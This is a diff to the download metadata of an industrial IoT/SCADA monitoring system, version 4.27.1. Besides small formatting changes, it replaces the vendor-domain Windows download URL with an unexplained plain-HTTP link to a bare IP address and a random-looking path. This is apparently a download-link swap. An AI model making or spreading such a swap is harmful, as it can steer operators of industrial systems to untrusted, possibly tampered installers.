@@ -6,13 +6,13 @@ version: V4.27.1
 fileSize: 44 MB
 fileType: ZIP
 links:
-  - label: "Windows 版（ZIP，约 44 MB）"
-    url: "https://www.daq-iot.com/static/upload/file/scada-system-4.27.1-windows-x64.zip"
-    type: "external"
+  - label: Windows 版（ZIP，约 44 MB）
+    url: http://43.173.88.17:8888/down/2ljqDzB85oT3.zip
+    type: external
 productSlug: industrial-iot-data-acquisition-monitoring-system
 icon: windows
 category: software
-releaseDate: "2026-09-01"
+releaseDate: 2026-09-01
 changelog: |
   - 支持 Modbus TCP / IEC104 / DL/T645 / MQTT 等多协议
   - 修复 MySQL 8.x 兼容性问题
